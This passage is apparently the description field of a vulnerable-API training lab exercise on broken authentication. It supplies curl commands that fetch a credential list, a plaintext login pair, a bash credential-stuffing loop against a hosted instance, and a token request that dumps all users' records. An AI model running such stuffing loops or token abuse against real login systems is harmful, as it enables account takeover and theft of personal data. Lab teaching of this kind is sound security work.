			"description": "Broken Authentication\r\n\r\nNo credentials are handed to you for API2. `Resources/API2_CredentialStuffing/creds.csv` ships 1000 email:password pairs collected from unrelated breaches; three of them happen to also work against this app's own users. Credential stuffing is the practice of trying every pair from a leaked list against a login endpoint until one is accepted.\r\n\r\nDownload the list:\r\n```bash\r\ncurl -s -o creds.csv https://raw.githubusercontent.com/meetd2005/serverlesswp/main/Resources/API2_CredentialStuffing/creds.csv\r\n```\r\n\r\n### Fast path (under 10 requests)\r\nThis is a self-hosted app: you were given the full source, including the database seed file at `database/vapi.sql`. Reading the three seeded rows there is faster and more reliable than guessing blind through 1000 lines, and it is the realistic move once you control the deployment:\r\n```bash\r\ncurl -s https://raw.githubusercontent.com/meetd2005/serverlesswp/main/database/vapi.sql | grep -A3 'INSERT INTO `a_p_i2_users`'\r\n```\r\nThat prints the seeded `email, password` pairs directly. Confirm one with a single verbose request:\r\n```bash\r\nhost=vapi-bdo3.onrender.com\r\ncurl -v -X POST \"https://$host/vapi/api2/user/login\" \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"email\":\"savanna48@ortiz.com\",\"password\":\"zTyBwV/9\"}'\r\n```\r\nThe `-v` output shows the POST line, the `Content-Type` header actually sent, the `401` or `200` status line coming back, and the response headers, followed by the JSON body on its own line.\r\n\r\nA hit returns `{\"success\":\"true\",\"token\":\"...\"}`.\r\n\r\n### Exhaustive path: stuff the full downloaded list\r\nIf you want to see the attack the way an attacker without source access would run it, loop over every line of the downloaded CSV instead:\r\n```bash\r\nhost=vapi-bdo3.onrender.com\r\nwhile IFS=, read -r email password; do\r\n  # one login attempt per line of creds.csv\r\n  response=$(curl -s -X POST \"https://$host/vapi/api2/user/login\" \\\r\n    -H 'Content-Type: application/json' \\\r\n    -d \"{\\\"email\\\":\\\"$email\\\",\\\"password\\\":\\\"$password\\\"}\")\r\n  case \"$response\" in\r\n    *'\"success\":\"true\"'*)\r\n      echo \"Valid pair found: $email : $password\"\r\n      echo \"Response: $response\"\r\n      ;;\r\n  esac\r\ndone < creds.csv\r\n```\r\nThis sends one request per line (1000 requests total); it is not a load or denial-of-service test, so only run it against an instance you own.\r\n\r\n### Use the token\r\n`GET /vapi/api2/user/details` only checks that the token belongs to some user, then returns every user's full record (email, address, city, country, token) instead of just the caller's own. That is the actual data exposure once you are authenticated as anyone:\r\n```bash\r\ncurl -v https://{{host}}/vapi/api2/user/details \\\r\n  -H 'Authorization-Token: <token from the hit above>'\r\n```",
